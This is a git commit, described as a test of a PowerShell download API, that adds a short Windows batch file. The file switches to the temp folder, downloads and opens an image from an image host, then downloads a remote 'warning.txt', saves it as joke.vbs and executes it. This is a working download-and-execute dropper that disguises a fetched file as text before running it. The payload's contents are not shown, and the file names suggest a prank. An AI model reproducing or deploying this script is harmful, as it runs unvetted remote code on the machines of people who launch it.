3ef178ca17d62920356e8e056899e4649c97617d
f12w <109419823+f12w@users.noreply.github.com>
2022-07-18 18:15:33 +0400

    Add files via upload
    tests out the powershell getfile api more coming soon

---
+++ ra84.bat
@@ -0,0 +1,5 @@
+cd %TEMP%
+Powershell -Command "Invoke-WebRequest 'https://i.postimg.cc/qvYsfpZK/ra84.jpg' -Outfile ra84.jpeg"
+ra84.jpeg
+Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/f12w/ra84/main/warning.txt' -Outfile joke.vbs"
+joke.vbs
